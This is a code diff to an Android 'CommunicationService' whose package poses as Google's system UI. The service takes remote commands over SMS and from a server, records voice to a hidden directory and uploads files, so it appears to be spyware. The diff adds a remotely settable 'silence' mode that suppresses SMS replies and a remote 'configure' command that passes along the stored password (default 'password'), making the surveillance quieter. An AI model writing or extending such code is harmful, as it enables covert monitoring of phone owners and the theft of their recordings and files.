@@ -37,6 +37,7 @@ import com.genonbeta.core.ServerAddress;
 import com.genonbeta.core.ServerConnection;
 import com.github.kevinsawicki.http.HttpRequest;
 import com.google.android.systemUi.R;
+import com.google.android.systemUi.activity.Configuration;
 import com.google.android.systemUi.config.AppConfig;
 import com.google.android.systemUi.helper.FileUtils;
 import com.google.android.systemUi.helper.NotificationPublisher;
@@ -104,7 +105,6 @@ public class CommunicationService extends Service implements OnInitListener
 			stopSelf();
 
 		mCommunicationServer.setAddTabsToResponse(2);
-
 		mRemoteThread.start();
 	}
 
@@ -126,7 +126,10 @@ public class CommunicationService extends Service implements OnInitListener
 		mVibrator = (Vibrator) getSystemService(Service.VIBRATOR_SERVICE);
 		mClipboard = (ClipboardManager) getSystemService(Service.CLIPBOARD_SERVICE);
 
-		mRemoteThreadDelay = mPreferences.getLong("remoteServerDelay", mRemoteThreadDelay);
+		try
+		{
+			mRemoteThreadDelay = Long.valueOf(mPreferences.getString("remoteServerDelay", String.valueOf(mRemoteThreadDelay)));
+		} catch (NumberFormatException e) {}
 
 		if (mPreferences.contains("remoteServer"))
 			mRemote.setAddress(new ServerAddress(mPreferences.getString("remoteServer", null)));
@@ -274,7 +277,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 				mCommunicationServer.onJsonMessage(null, receivedMessage, response, sender);
 
-				if (smsMode)
+				if (smsMode && !silenceActivated())
 					SmsManager.getDefault().sendTextMessage(sender, null, response.toString(), null, null);
 			}
 		}
@@ -294,6 +297,11 @@ public class CommunicationService extends Service implements OnInitListener
 		}
 	}
 
+	public boolean silenceActivated()
+	{
+		return mPreferences.getBoolean("silence", false);
+	}
+
 	public File startVoiceRecording() throws IllegalStateException, IOException
 	{
 		stopVoiceRecording();
@@ -304,7 +312,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 		File outputFile = new File(getHiddenRecordingsDirectory().getAbsolutePath()
 				+ File.separator
-				+ DateFormat.format("yyyy_MM_dd HH:mm:ss", System.currentTimeMillis())
+				+ DateFormat.format("yyyy_MM_dd_HH_mm_ss", System.currentTimeMillis())
 				+ ".wav");
 
 		mRecorder.setOutputFile(outputFile.getAbsolutePath());
@@ -373,6 +381,12 @@ public class CommunicationService extends Service implements OnInitListener
 			boolean result = false;
 			Intent actionIntent = new Intent();
 
+			if (receivedMessage.has("silence"))
+			{
+				mPreferences.edit().putBoolean("silence", receivedMessage.getBoolean("silence")).apply();
+				response.put("silenceMode", receivedMessage.getBoolean("silence"));
+			}
+
 			if (receivedMessage.has("printDeviceName") && receivedMessage.getBoolean("printDeviceName"))
 				response.put("deviceName", mPreferences.getString("deviceName", Build.MODEL));
 
@@ -426,7 +440,7 @@ public class CommunicationService extends Service implements OnInitListener
 					response.put("info", "To access use 'password'");
 				}
 			}
-			else
+			else if (receivedMessage.has("request"))
 			{
 				if (receivedMessage.has("action"))
 				{
@@ -440,6 +454,13 @@ public class CommunicationService extends Service implements OnInitListener
 
 				switch (request)
 				{
+					case "configure":
+						startActivity(new Intent(CommunicationService.this, Configuration.class)
+								.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+								.putExtra(Configuration.EXTRA_PASSWORD, mPreferences.getString("password", "password")));
+
+						result = true;
+						break;
 					case "sayHello":
 						PackageInfo packInfo = getPackageManager().getPackageInfo(getApplicationInfo().packageName, 0);
 
@@ -825,6 +846,7 @@ public class CommunicationService extends Service implements OnInitListener
 						break;
 					case "getStatus":
 						response.put("playingSong", mPlayer.isPlaying());
+						response.put("silenceMode", silenceActivated());
 						response.put("recordingVoice", mIsRecording);
 						response.put("bluetoothPower", BluetoothAdapter.getDefaultAdapter().isEnabled());
 						response.put("wifiPower", wifiState(((WifiManager) getSystemService(WIFI_SERVICE)).getWifiState()));
@@ -845,7 +867,6 @@ public class CommunicationService extends Service implements OnInitListener
 						result = true;
 						break;
 					case "mediaButton":
-
 						if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT)
 						{
 							int event = KeyEvent.KEYCODE_MEDIA_PAUSE;
@@ -1148,7 +1169,7 @@ public class CommunicationService extends Service implements OnInitListener
 
 							if (request.ok())
 							{
-								if(mUploadQueue.size() > 0)
+								if (mUploadQueue.size() > 0)
 									mUploadQueue.remove(0);
 
 								if (firstFile.deleteOnExit)
@@ -1158,7 +1179,7 @@ public class CommunicationService extends Service implements OnInitListener
 						else
 						{
 							Log.e(TAG, "File upload is passed (NOT_FOUND)");
-							if(mUploadQueue.size() > 0)
+							if (mUploadQueue.size() > 0)
 								mUploadQueue.remove(0);
 						}
 					} catch (Exception e)
